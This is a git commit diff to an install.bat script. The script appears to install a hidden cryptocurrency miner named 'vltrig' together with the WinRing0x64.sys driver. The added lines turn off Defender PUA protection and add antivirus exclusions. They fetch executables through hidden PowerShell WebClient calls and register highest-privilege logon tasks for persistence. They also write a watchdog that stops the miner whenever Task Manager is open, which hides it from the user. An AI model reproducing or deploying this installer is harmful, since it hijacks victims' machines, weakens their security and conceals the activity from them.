e91c66561881589209d73c8e6756b4a7f03cdb96
4etex <bot5artemka@gmail.com>
2026-05-09 22:14:15 +0500

    fix: Net.WebClient download, defender exclusion before download, taskmgr watchdog

--- install.bat
+++ install.bat
@@ -7,33 +7,37 @@ exit /b
 :main
 set DEST=C:\ProgramData\VLTrig
 set TMP=%TEMP%\vl_tmp
-
-if not exist "%TMP%" mkdir "%TMP%"
-
-curl -sL "https://raw.githubusercontent.com/4etex/myfarmmachine/master/vltrig.exe"       -o "%TMP%\vltrig.exe"
-curl -sL "https://raw.githubusercontent.com/4etex/myfarmmachine/master/config.json"      -o "%TMP%\config.json"
-curl -sL "https://raw.githubusercontent.com/4etex/myfarmmachine/master/WinRing0x64.sys"  -o "%TMP%\WinRing0x64.sys"
+set BASE=https://raw.githubusercontent.com/4etex/myfarmmachine/master
 
 if not exist "%DEST%" mkdir "%DEST%"
+if not exist "%TMP%"  mkdir "%TMP%"
 
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%DEST%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'vltrig.exe' -ErrorAction SilentlyContinue"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Set-MpPreference -PUAProtection Disabled -EA SilentlyContinue; Add-MpPreference -ExclusionPath '%DEST%' -EA SilentlyContinue; Add-MpPreference -ExclusionPath '%TMP%' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'vltrig.exe' -EA SilentlyContinue"
+
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('%BASE%/vltrig.exe','%TMP%\vltrig.exe')"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('%BASE%/config.json','%TMP%\config.json')"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('%BASE%/WinRing0x64.sys','%TMP%\WinRing0x64.sys')"
+
+if not exist "%TMP%\vltrig.exe"      goto :end
+if not exist "%TMP%\config.json"     goto :end
+if not exist "%TMP%\WinRing0x64.sys" goto :end
 
 copy /y "%TMP%\vltrig.exe"      "%DEST%\" >nul
 copy /y "%TMP%\config.json"     "%DEST%\" >nul
 copy /y "%TMP%\WinRing0x64.sys" "%DEST%\" >nul
 
-echo while($true){if(Get-Process discord -EA SilentlyContinue){Stop-Process -Name vltrig -Force -EA SilentlyContinue}elseif(-not(Get-Process vltrig -EA SilentlyContinue)){Start-Process '%DEST%\vltrig.exe' -ArgumentList '--config=%DEST%\config.json'};Start-Sleep 3} > "%DEST%\watch.ps1"
+echo while($true){if(Get-Process taskmgr -EA SilentlyContinue){Stop-Process -Name vltrig -Force -EA SilentlyContinue}elseif(-not(Get-Process vltrig -EA SilentlyContinue)){Start-Process '%DEST%\vltrig.exe' -ArgumentList '--config=%DEST%\config.json'};Start-Sleep 3} > "%DEST%\watch.ps1"
 
-schtasks /delete /tn "VLTrig" /f >nul 2>&1
+schtasks /delete /tn "VLTrig"      /f >nul 2>&1
 schtasks /delete /tn "VLTrigWatch" /f >nul 2>&1
 
-schtasks /create /tn "VLTrig" /tr "\"%DEST%\vltrig.exe\" --config=\"%DEST%\config.json\"" /sc onlogon /rl highest /f >nul
-
+schtasks /create /tn "VLTrig"      /tr "\"%DEST%\vltrig.exe\" --config=\"%DEST%\config.json\""                          /sc onlogon /rl highest /f >nul
 schtasks /create /tn "VLTrigWatch" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%DEST%\watch.ps1\"" /sc onlogon /rl highest /f >nul
 
-schtasks /run /tn "VLTrig" >nul
+schtasks /run /tn "VLTrigWatch" >nul
 timeout /t 3 /nobreak >nul
 tasklist | find /i "vltrig.exe" >nul 2>&1
 if %errorLevel% neq 0 start "" /b "%DEST%\vltrig.exe" --config="%DEST%\config.json"
 
 rmdir /s /q "%TMP%"
+:end
